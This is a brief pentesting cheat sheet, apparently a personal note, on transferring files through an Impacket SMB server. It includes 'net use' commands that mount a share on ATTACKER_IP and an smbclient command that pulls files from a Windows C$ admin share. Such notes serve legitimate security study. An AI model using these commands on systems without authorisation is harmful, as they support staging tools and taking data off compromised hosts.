# Impacket SMB Server
This is another way to transfer files by creating our own SMB server.

##### Linux Server
Start

```
sudo python3 /opt/impacket/examples/smbserver.py SHARE_NAME DIRECTORY -smb2support -username USERNAME -password PASSWORD
```

##### Windows Client
**NOTE:On If NTLM authentication is blocked this will not work. Use [NetCat](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FNetwork%2FNetCat%20%26%20PowerCat) as an alternative** 
Login 

```
net use DRIVE: \\ATTACKER_IP\SHARE_NAME /user:USERNAME PASSWORD # -smb2support

net use z: \\192.168.49.163\kali /user:harry harry 
```

Copy File

```
copy FROM_FILE.EXT TO_FILE.EXE
```

Delete

```
net use \\ATTACKER_IP\SHARE_NAME /del
net use DRIVE_NAME_USED: /del
```

##### Linux Client
Copy a file from a Windows share to a Linux box. 
```
smbclient '//windowsserver/c$' -c 'lcd /tmp; cd Directory; get file.txt' -U administrator%password
```

Copy Linux<->Linux
[https://linux.die.net/man/8/smbmount](https://linux.die.net/man/8/smbmount)

```
smbmount //IP_ADDRESS/share DRIVE: {options}
cp DRIVE:FROM_FILE /home/USER/LOCATION
```